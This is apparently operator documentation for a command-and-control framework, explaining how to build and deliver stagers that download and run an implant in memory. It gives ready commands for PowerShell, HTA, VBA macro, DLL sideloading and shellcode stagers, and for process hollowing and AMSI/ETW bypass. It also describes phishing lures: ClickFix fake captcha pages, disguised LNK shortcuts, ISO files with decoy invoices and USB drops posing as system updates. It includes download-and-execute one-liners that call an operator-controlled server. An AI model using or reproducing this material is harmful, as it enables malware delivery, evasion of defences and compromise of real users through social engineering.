# Stager & Staged Delivery

Staged delivery splits payload delivery into two phases: a tiny stager that delivers itself first, then downloads and executes the full agent from the C2 server — in memory, without writing the agent to disk.

---

## Staged vs Stageless

| | Stageless | Staged |
|---|---|---|
| **Initial payload size** | 8–15 MB | 1–3 MB |
| **Agent on disk** | Yes | Never |
| **AV static scan risk** | High (full agent present) | Low (stager only, agent encrypted on server) |
| **Memory scan risk** | High (agent loaded immediately) | Low (download + decrypt in memory) |
| **Requires C2 at exec time** | No | Yes |
| **Best for** | USB drop, lab, reliable delivery | Phishing, ClickFix, EDR-heavy targets |

**Staged delivery flow:**
```
[Stager ~2MB delivered to target]
          │
          │ HTTPS GET /stage/TOKEN
          ▼
[C2 server: decrypt + serve agent]
          │
          │ AES-256-GCM payload
          ▼
[Stager: decrypt agent in memory]
          │
          │ reflective load / hollow / drop
          ▼
[Agent running — no agent file on disk]
          │
          │ beacon every N seconds
          ▼
[C2 server receives commands]
```

---

## Architecture

```
OPERATOR MACHINE
  1. build agent EXE/shellcode
  2. upload → C2 server (gets token)
  3. generate stager (embeds token + server URL)
  4. deliver stager to target

          ▼ /api/v1/stage (operator endpoint, authenticated)
┌─────────────────────────────────────────────────────┐
│                   C2 SERVER                          │
│                                                      │
│  /api/v1/*     — operator endpoints (API key)        │
│  /beacon       — agent check-in                      │
│  /stage/:token — unauthenticated single-download     │
│                                                      │
│  stages table: token | payload (AES-GCM) | expires   │
└─────────────────────────────────────────────────────┘
          │
          │ GET /stage/TOKEN (one-shot, then invalidated)
          ▼
TARGET MACHINE
  stager → download → decrypt in memory → execute agent → beacon
```

### One-Shot Tokens

Every stage URL is a single-use token. After the stager downloads the payload, the token is marked `used` and the URL returns 410. This means:
- A defender who captures the URL cannot re-download the agent
- Each deployment requires a fresh upload + fresh token
- The window of exposure is exactly one download

---

## Step-by-Step Workflow

### Step 1 — Start the Server

```bash
ENCRYPTION_KEY=changeme go run ./cmd/server --port 8080
```

Verify:
```bash
curl http://SERVER:8080/api/v1/health
# {"success":true,"message":"OK"}
```

### Step 2 — Build the Full Agent

The full agent is what gets staged (uploaded to the server). Build it for the target platform:

```bash
go run ./cmd/generate stageless \
  --c2 http://SERVER:8080 \
  --key changeme \
  --profile stealth \
  --arch amd64 \
  --no-gui \
  --output ./builds/agent.exe
```

### Step 3 — Upload Agent to the Stage Endpoint

```bash
go run ./cmd/generate upload ./builds/agent.exe \
  --server http://SERVER:8080 \
  --desc "engagement-q2-2026"
```

**Output:**
```
[+] Stage uploaded (9,842,512 bytes)
    Token    : 3a8f91c2d4b5e607f8091a2b3c4d5e6f
    Stage URL: http://SERVER:8080/stage/3a8f91c2d4b5e607f8091a2b3c4d5e6f
    Expires  : 2026-04-27T12:00:00Z
    Name     : engagement-q2-2026
```

**Save the token.** It is shown only once at upload time.

What happens on the server:
1. CLI sends the agent binary to `/api/v1/stage` (authenticated)
2. Server encrypts it with AES-256-GCM using `ENCRYPTION_KEY`
3. Stores ciphertext in SQLite with a random 32-hex token
4. Returns the token

The raw agent binary never sits unencrypted on the server — only the ciphertext is stored.

### Step 4 — Verify the Stage Exists

```
❯ stages
[+] Active stages:

TOKEN                              NAME                   EXPIRES
-------------------------------------------------------------------
3a8f91c2d4b5e607f8091a2b3c4d5e6f  engagement-q2-2026     2026-04-27 12:00:00 UTC
```

`USED` should be empty/false. If it shows used, the token was already consumed — re-upload.

### Step 5 — Generate the Stager

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token 3a8f91c2d4b5e607f8091a2b3c4d5e6f \
  --format ps1 \
  --output ./delivery/stager.ps1
```

The stager binary knows only:
- The server URL to download from
- The token identifying the payload
- The AES key to decrypt the downloaded payload
- How to execute the decrypted payload (exec-method)

### Step 6 — Deliver the Stager

See [Delivery Methods](#delivery-methods) below.

### Step 7 — Agent Checks In

After the stager runs on the target:
```
❯ agents list
[+] Found 1 agent(s)
AGENT ID         HOSTNAME      USERNAME    STATUS   LAST SEEN
-------------------------------------------------------------
a1b2c3d4-...     CORP-PC01     corp\jdoe   online   just now
```

### Step 8 — OPSEC Sequence (First Thing After Check-In)

```
❯ opsec antidebug a1b2
❯ opsec antivm a1b2
❯ evasion unhook a1b2
❯ bypass amsi a1b2
❯ bypass etw a1b2
```

---

## Stager Formats

### `ps1` — PowerShell Wrapper

```bash
./bin/generate stager \
  --server https://C2:8443 \
  --key $ENCRYPTION_KEY \
  --token TOKEN \
  --format ps1 \
  --output stager.ps1
```

The PS1 script downloads the staged payload, writes it to `%TEMP%`, and executes it hidden.

**Execute on target:**
```powershell
# Direct file execution
powershell -ExecutionPolicy Bypass -File stager.ps1

# Encoded one-liner (for ClickFix, Win+R delivery)
$bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content stager.ps1 -Raw))
$b64 = [System.Convert]::ToBase64String($bytes)
powershell -w hidden -ep bypass -enc <B64>
```

> **AV Detection Warning:** PS1 is a plaintext script — AMSI scans it before and during execution. Even with AMSI/ETW bypass built into the preamble, Windows Defender 2024+ will detect the script at rest via static scanning.
>
> **Recommendations:**
> - Use `--format exe` for production engagements (compiled binary, no plaintext)
> - Use `--format ps1-mem` if PS1 delivery is required (shellcode in-memory, no EXE dropped to disk)
> - If the PS1 must be used, deliver via encoded one-liner and do NOT save to disk — pipe directly: `IEX (New-Object Net.WebClient).DownloadString(...)`

**When to use:** Lab environments, environments without Defender/EDR, or when combined with an external obfuscator (Invoke-Obfuscation, AMSI.fail).

---

### `ps1-mem` — In-Memory Shellcode Runner

```bash
# Step 1: Convert agent EXE to shellcode first (requires donut)
donut -i ./builds/agent.exe -o ./builds/agent.bin -a 2

# Step 2: Upload the shellcode (not EXE) as the stage
go run ./cmd/generate upload ./builds/agent.bin \
  --server http://SERVER:8080 \
  --format shellcode \
  --desc "shellcode-stage"

# Step 3: Generate ps1-mem stager with shellcode token
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN_FROM_SHELLCODE_UPLOAD \
  --format ps1-mem \
  --output stager_mem.ps1
```

The PS1 downloads the shellcode and executes it with `VirtualAlloc(RWX)` + `CreateThread` — the agent never touches disk.

**When to use:** Targets with AV scanning disk writes. Full fileless delivery chain.

**Important:** `ps1-mem` requires a shellcode stage, not an EXE. Using an EXE with `ps1-mem` will crash. Use `donut` or `sRDI` to convert.

---

### `exe` — Binary Stager

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format exe \
  --output stager.exe
```

A compiled binary stager (~300KB). Double-click to run. No PowerShell dependency.

**When to use:** USB drops, internal file shares, scenarios where PowerShell is restricted or monitored.

---

### `hta` — HTML Application

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format hta \
  --output update.hta
```

A Windows HTA file executed by `mshta.exe` via VBScript. Drops and runs the stager binary.

**Execute on target:**
```
Double-click update.hta
→ Windows Security dialog → Run
→ mshta.exe VBScript → download agent → execute

# Or via browser URL
mshta.exe http://YOURSITE/update.hta
```

**When to use:** Phishing via email with HTA attachment, "browser update" fake page.

---

### `vba` — Office Macro

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format vba \
  --output macro.bas
```

A VBA module to paste into Word/Excel.

**Deploy:**
1. Open Word or Excel
2. `Alt+F11` → Insert Module → paste `macro.bas` contents
3. Save as `.docm` / `.xlsm`
4. Phish target with the document

The macro downloads the agent binary via XMLHTTP, writes to `%TEMP%`, and executes it.

**When to use:** Spear-phishing with Office documents. Requires macros to be enabled (social engineering required post-Windows-11 policy changes).

---

### `dll` — DLL Sideloading

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format dll \
  --output version.dll
```

A DLL whose `DllMain` downloads and executes the agent.

**Deploy:** Place `version.dll` alongside an application that loads `version.dll` from its own directory (many legitimate apps do this — check with `Procmon`). When the app starts, `DllMain` fires automatically.

**When to use:** DLL sideloading scenarios — legitimate application loads your DLL, making the agent process appear as a child of a trusted application.

---

### `shellcode` — Raw Shellcode

```bash
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format shellcode \
  --output stager.bin
```

Raw x64 shellcode (sRDI-converted). Use with:
- `inject remote <id> --file stager.bin --pid <pid>` — inject into remote process
- A custom loader or BOF
- Any shellcode runner

---

## Execution Methods

The `--exec-method` flag controls how the agent is executed after being downloaded by the stager:

| Method | Behavior | AV/EDR Risk | Recommended |
|--------|----------|-------------|-------------|
| `drop` | Write agent to `%TEMP%`, `CreateProcess` | Medium (file on disk) | Lab / low-security targets |
| `hollow` | Spawn `svchost.exe` suspended, hollow memory, resume | Low (legitimate process host) | Production engagements |
| `thread` | `VirtualAlloc(RWX)` + `CreateThread` (shellcode only) | High (RWX memory pattern) | Avoid unless shellcode |

```bash
# Recommended for EDR environments
go run ./cmd/generate stager \
  --format ps1 \
  --exec-method hollow \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --output stager.ps1
```

---

## Delivery Methods

### ClickFix (Browser-Based Social Engineering)

```bash
go run ./cmd/generate template clickfix \
  --stager ./delivery/stager.ps1 \
  --lure browser-verification \
  --output delivery.html
```

The generated page shows a fake "Verify you are human" prompt. When the target clicks, the PowerShell command copies to their clipboard. The page instructs: "Press Win+R, paste, Enter."

**Available lures:** `browser-verification`, `captcha-check`, `security-update`, or any custom text.

**Why it works:** The target performs the action themselves — no exploit needed, no macro warning. Works on fully-patched Windows with modern browsers.

### Phishing Email — LNK Attachment

```bash
go run ./cmd/generate stager \
  --format ps1 \
  --output stager.ps1 \
  ...

# Embed in LNK shortcut
go run ./cmd/generate template lnk \
  --stager ./delivery/stager.ps1 \
  --icon "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" \
  --name "Microsoft Edge.lnk" \
  --output "Microsoft Edge.lnk"
```

LNK target: `powershell.exe -w hidden -ep bypass -enc BASE64`  
Icon: Edge or another trusted application.

Package in a ZIP or ISO for delivery via email.

### ISO Delivery

```bash
go run ./cmd/generate template iso \
  --stager ./delivery/stager.exe \
  --decoy "Invoice_Q2_2026.pdf" \
  --output delivery.iso
```

ISO contains:
```
delivery.iso
├── Invoice_Q2_2026.pdf   ← legitimate-looking decoy
└── Invoice Q2 2026.lnk   ← shortcut → stager.exe
```

User mounts ISO → sees only the shortcut (LNK hidden) → clicks → stager runs.

### Office Macro

```bash
go run ./cmd/generate stager --format vba --output macro.bas ...
```

Paste `macro.bas` into an Office document as a module. Save as `.docm` or `.xlsm` and attach to phishing email.

### USB Drop

Build a stageless agent and rename it convincingly:

```bash
go run ./cmd/generate stageless \
  --masq-orig "SystemUpdate.exe" \
  --masq-desc "Windows System Update" \
  ... \
  --output SystemUpdate.exe
```

Copy to USB at the root or inside a `DCIM/` folder (appears as a camera). Drop in target location.

---

## Stage Management

### List All Stages

```
❯ stages
TOKEN                              NAME                EXPIRES                 SIZE
----------------------------------------------------------------------------------
3a8f91c2...                        engagement-q2       2026-04-27 12:00 UTC   9.4 MB
b2c3d4e5...                        backup-stager       2026-04-26 08:00 UTC   9.4 MB
```

### Delete a Stage (Invalidate Token)

```
❯ queue clear TOKEN
[+] Stage deleted. URL is now inaccessible.
```

Delete unused stages immediately — the shorter the window, the less exposure.

---

## OPSEC Notes

**Always use HTTPS.** A stager downloading over HTTP exposes the agent to interception and MitM injection. Configure TLS on the server or use a CDN redirector.

**Set short TTL.** The stage only needs to be live long enough for the target to execute the stager. A 1-hour delivery window needs a 1-hour TTL, not 48 hours.

**One token per deployment.** Never reuse a token across different targets or retries. Each delivery = fresh upload + fresh token.

**User-Agent.** The stager uses a legitimate browser User-Agent for its download request — this avoids proxy rules that block unknown UA strings.

**Kill date on the agent.** Always bake in a kill date matching the engagement end:
```bash
--kill-date 2026-06-30
```

**Post-check-in sequence.** The very first thing to do after the agent connects is the evasion sequence (unhook → AMSI → ETW). Do this before any other operation.

---

## Troubleshooting

### 404 on Stage Download

Symptoms in server log: `GET /stage/TOKEN 404`

Causes:
- Stage was never uploaded (`generate upload` step skipped)
- Wrong token copied
- Token already expired (TTL elapsed)
- Token already consumed (used by a previous stager execution)

Fix:
```bash
# Check current stages
❯ stages

# Re-upload if needed
go run ./cmd/generate upload ./builds/agent.exe --server http://SERVER:8080 --desc "retry"
# Generate new stager with new token
```

### 410 Gone — Token Consumed

Stage was already downloaded once (one-shot token). Re-upload and generate a new stager.

### Agent Does Not Check In

1. **Connectivity:** Can the target reach the server?
   ```powershell
   Test-NetConnection -ComputerName SERVER -Port 8080
   ```

2. **Firewall:** Port open on server?
   ```bash
   sudo ufw allow 8080/tcp
   ```

3. **Key mismatch:** `--key` on generate must match `ENCRYPTION_KEY` on server. Rebuild agent if mismatched.

4. **ps1-mem crash:** Stage is an EXE but format is `ps1-mem`. Convert EXE to shellcode with `donut` first.

5. **AV blocked stager:** Run stager from a visible PowerShell window (not hidden) to see error output. Apply evasion profile or use `hollow` exec-method.

---

## Quick Reference

```bash
# ─── SERVER ───────────────────────────────────────────────────────
ENCRYPTION_KEY=changeme go run ./cmd/server --port 8080

# ─── BUILD FULL AGENT ──────────────────────────────────────────────
go run ./cmd/generate stageless \
  --c2 http://SERVER:8080 --key changeme \
  --profile stealth --no-gui \
  --arch amd64 \
  --output ./builds/agent.exe

# ─── UPLOAD TO STAGE ───────────────────────────────────────────────
go run ./cmd/generate upload ./builds/agent.exe \
  --server http://SERVER:8080 \
  --desc "engagement-label"
# → saves token

# ─── GENERATE STAGER ───────────────────────────────────────────────
go run ./cmd/generate stager \
  --server http://SERVER:8080 \
  --key changeme \
  --token TOKEN \
  --format ps1 \
  --exec-method hollow \
  --output ./delivery/stager.ps1

# ─── AFTER CHECK-IN ────────────────────────────────────────────────
❯ opsec antidebug <id>
❯ opsec antivm <id>
❯ evasion unhook <id>
❯ bypass amsi <id>
❯ bypass etw <id>
```

### Format Selector

```
Need fileless? (no agent on disk)
├── No  → exe, ps1 (exec-method drop)
└── Yes → ps1-mem (needs shellcode stage via donut)
           OR ps1 (exec-method hollow)

Delivery channel?
├── Email attachment → ps1, hta, vba
├── ClickFix / Win+R → ps1 (encoded one-liner)
├── USB / file share → exe
├── Office document  → vba macro
├── DLL hijacking    → dll
└── Inject to process → shellcode

EDR present?
├── No  → exec-method drop
├── Yes → exec-method hollow (preferred)
└── Memory scanner → ps1-mem + donut shellcode
```
